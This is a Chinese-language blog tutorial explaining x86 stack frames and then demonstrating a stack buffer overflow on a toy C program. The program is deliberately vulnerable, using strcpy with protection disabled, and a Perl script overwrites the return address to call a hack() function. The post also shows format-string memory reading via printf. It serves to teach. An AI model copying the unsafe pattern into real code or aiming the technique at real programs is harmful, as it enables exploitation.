---
layout: post
title: Buffer Overflow Attack
tags: [程序员自我修养, C/C++]
keywords: Buffer Overflow Attack, Stack基本原理
description: Buffer Overflow通常指的是程序在向一个Buffer写入数据的时候，超出了Buffer的边界，从而对超出Buffer范围的内存进行写入。Buffer Overflow，会导致程序的一些异常行为，而容易被利用，使得程序遭到攻击。Buffer Overflow分为Heap和Stack，我这里主要讲解Stack上的Buffer Overflow。在讲解Buffer Overflow Attack之前，我们需要复习系C语言Stack的工作方式和原理。
category: 程序员自我修养
comments: true
share: true
---

Buffer Overflow通常指的是程序在向一个Buffer写入数据的时候，超出了Buffer的边界，从而对超出Buffer范围的内存进行写入。Buffer Overflow，会导致程序的一些异常行为，而容易被利用，使得程序遭到攻击。Buffer Overflow分为Heap和Stack，我这里主要讲解Stack上的Buffer Overflow。

##Stack基本工作原理
在讲解Buffer Overflow Attack之前，我们需要复习系C语言Stack的工作方式和原理。

在堆栈的操作中，有三个非常重要的寄存器：

* ebp
ebp存放的是栈底的地址，ebp是一个静态寄存器。
* esp
esp存放的是栈顶的地址。ebp与esp之间的内存，即为Stack内存空间。ebp和esp确定一个Stack Frame栈帧。
* eip
eip是cpu下一步将要执行的地址。

我们通常说，在函数执行调用执行之前，需要保护现场，其中ebp，esp，eip是三个重要的保护对象。

我们还是用一个demo来阐述Stack的工作原理：
{% highlight C++ linenos %}
// stack.h
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void plus(int a, int b)
{
    int c = a + b;
    printf("the plus result = %d\n", c);
}

int main(int argc, char** argv)
{
    int a = 9;
    int b = 18;
    plus(a, b);

    return 0;
}
{% endhighlight %}
编译命令如下：
    gcc -g -m32 stack.c
使用objdump dump出来的main和plus函数的汇编代码如下：
{% highlight objdump linenos %}
080483e4 <plus>:
 80483e4:   55                      push   %ebp
 80483e5:   89 e5                   mov    %esp,%ebp
 80483e7:   83 ec 28                sub    $0x28,%esp
 80483ea:   8b 45 0c                mov    0xc(%ebp),%eax
 80483ed:   8b 55 08                mov    0x8(%ebp),%edx
 80483f0:   01 d0                   add    %edx,%eax
 80483f2:   89 45 f4                mov    %eax,-0xc(%ebp)
 80483f5:   b8 10 85 04 08          mov    $0x8048510,%eax
 80483fa:   8b 55 f4                mov    -0xc(%ebp),%edx
 80483fd:   89 54 24 04             mov    %edx,0x4(%esp)
 8048401:   89 04 24                mov    %eax,(%esp)
 8048404:   e8 f7 fe ff ff          call   8048300 <printf@plt>
 8048409:   c9                      leave
 804840a:   c3                      ret

0804840b <main>:
 804840b:   55                      push   %ebp
 804840c:   89 e5                   mov    %esp,%ebp
 804840e:   83 e4 f0                and    $0xfffffff0,%esp
 8048411:   83 ec 20                sub    $0x20,%esp
 8048414:   c7 44 24 18 09 00 00    movl   $0x9,0x18(%esp)
 804841b:   00
 804841c:   c7 44 24 1c 12 00 00    movl   $0x12,0x1c(%esp)
 8048423:   00
 8048424:   8b 44 24 1c             mov    0x1c(%esp),%eax
 8048428:   89 44 24 04             mov    %eax,0x4(%esp)
 804842c:   8b 44 24 18             mov    0x18(%esp),%eax
 8048430:   89 04 24                mov    %eax,(%esp)
 8048433:   e8 ac ff ff ff          call   80483e4 <plus>
 8048438:   b8 00 00 00 00          mov    $0x0,%eax
 804843d:   c9                      leave
 804843e:   c3                      ret
 804843f:   90                      nop
{% endhighlight %}
在main函数中，一开始的2条汇编语句：
{% highlight asm %}
push %ebp
mov %esp,%ebp
{% endhighlight %}
首先是保存调用main函数调用者的栈底ebp，由于main函数的调用者的栈顶esp同时也是main函数的栈底，所有mov %esp,%ebp。此时esp = ebp。

紧接着：
{% highlight asm %}
sub    $0x20,%esp
{% endhighlight %}
由于栈的生长方向是向低地址的方向生长,esp = esp - 0x20。此时，ebp和esp确定了main函数的栈，其大小是32个字节。

之后的几个movl和mov，分别是给局部变量a，b分配空间和把要传递给plus的参数压栈。
在跳转到plus函数之前我们得到的main函数的栈内存情况如下：

<center>
![Alt Text](/images/mainStack.svg)
</center>
从上图中，你会发现，在跳转到plus函数之前，main函数的栈中多了一个eip。那么eip是在什么时候被压栈的呢？
其实是call操作的结果, call语句等价于下面的2句话：
{% highlight asm %}
push %eip
jump 80483e4 <plus>
{% endhighlight %}
push %eip是为了保存在plus函数执行完之后，要之下main函数的下一条语句的地址。

在进入plus函数之后，到plus leave之前，我们得到的栈内存情况如下图：
<center>
![Alt Text](/images/plusStack.svg)
</center>


上面讲到的是函数调用，栈的生长情况，在函数执行结束返回的以后，栈的操作恰好跟之前的操作相反。
在plus函数直接结束后，即将返回到main函数，使用了leave和ret。
一条leave语句相当于：
{% highlight asm %}
move %ebp,%esp
pop %ebp
{% endhighlight %}
让esp=ebp，相当于将plus的局部变量清楚，最后从栈中pop一个值存放到ebp中。这个值就是进入plus之后的第一条语句push的那个main函数的ebp。
那么，plus返回了，怎么才能知道下一条要执行什么语句呢？ret则做了最后的恢复工作，ret相当于：
{% highlight asm %}
pop %eip
{% endhighlight %}
eip被重新pop出来，恢复到进入plus函数之前的现场。


##Buffer Overflow

上面讲解了Stack的基本工作原理，我们再来看看，Linux下内存分布情况：
<center>
![Alt Text](/images/memory-layout.svg)
</center>
stack和heap的内存生长方向如图所示。在编译器不做保护的情况下，理论上，我们是可以操作stack和heap上的任何内存的。

{% highlight C++ linenos %}
// stack.c
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void copyCmds(char* str)
{
    char buff[6];
    printf("\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n\n");
    strcpy(buff, str);
    printf("\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n%08x\n\n");
}

void hack()
{
    printf("Hi, I am hacking\n");
}

int main(int argc, char** argv)
{
    if (argc != 2)
      return 0;
    printf("copyCmds = %08x\n hack = %08x\n", copyCmds, hack);
    copyCmds(argv[1]);

    return 0;
}
{% endhighlight %}

这段代码，一眼就看出来漏洞在于直接使用了strcpy而没有对长度进行限制。我这里仅仅只是拿来演示，如何通过stack overflow来让hack函数被调用。

我们可以看到，main函数调用了copycmds，根据之前我们对函数调用的分析，在main函数调用copyCmds之前，会将copyCmds返回之后要执行的地址存在eip中，然后push eip。当copyCmds返回之后，直接pop stack放到eip中，继续执行。如果我们可以改变这个push到stack上的eip的值，那么我们既可以控制copyCmds函数返回之后的行为，即下一条要执行的语句。

###窥探stack内容
在C/C++中，由于printf实现的原因，在printf内部，会从printf的stack上按顺序取出printf的参数进行解析。

    printf("\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n");
在copyCmds中，这句话就是用来查看stack上的数据。由于只给printf传递了格式化字符串，printf从stack上取出地址，然后按照格式化字符串中的格式进行解析。

另外，我们还可以使用printf查看指定地址的内存单元的内容：
    printf("\x87\x06\x34\x76 %08x %08x %08x %08x %08x");
可以用来查看0x76340687处的内存。在c语言中，字符串中使用\x的时候，编译器会将其替换成hex，然后存放在内存中。 %08x使得printf从stack的顶端开始移动，由于printf的格式化字符串也是存放在stack上的，如果我们通过%08x移动到存放格式化字符串的地方，就可以打印0x76340687处的内存了。我这里只是假设要到达格式化字符串的存储位置需要4个%08x, 也就是4个字节，最后一个%08x是用来解释0x76340687处的内容的。

###触发stack overflow
上面的代码编译命令如下：

    gcc -g -m32 -fno-stack-protector stack.c
-fno-stack-protector是为了disable编译器对stack溢出的保护。
我们先执行一遍，查看hack函数的地址：

    ./a.out hello
我的输出如下：

    copyCmds = 08048444
    hack = 08048478

由于c语言命令行字符串转换原因，我们没办法直接在命令行向可执行文件传递hex参数。这里，我借助了perl脚本：
{% highlight pl linenos %}
$arg = "aaaaaaaaaaaaaaaaaa"."\x78\x84\x04\x08";
$cmd = "./a.out ".$arg;

system($cmd);

{% endhighlight %}

    perl hack.pl
执行结果如下：

    copyCmds = 08048444
    hack = 08048478
    00000000
    ffe0e1a8
    f75feeff
    f7758a20
    08048628
    ffe0e198
    f75feed0
    08048628
    f7789918
    ffe0e1a8
    080484cf
    ffe0e443
    08048444
    08048478
    f7757ff4
    080484e0
    00000000
    00000000
    f75cb4d3
    00000002
    ffe0e443
    ffe0e1a8
    f75feeff
    f7758a20
    08048628
    6161e198
    61616161
    61616161
    61616161
    61616161
    08048478
    ffe0e400
    08048444
    08048478
    f7757ff4
    080484e0
    00000000
    00000000
    f75cb4d3
    00000002
    Hi, I am hacking

其中，perl脚本中字符串a的数量是我试了多次才hack成功。不同的机器上，可能需要overflow的个数不同。


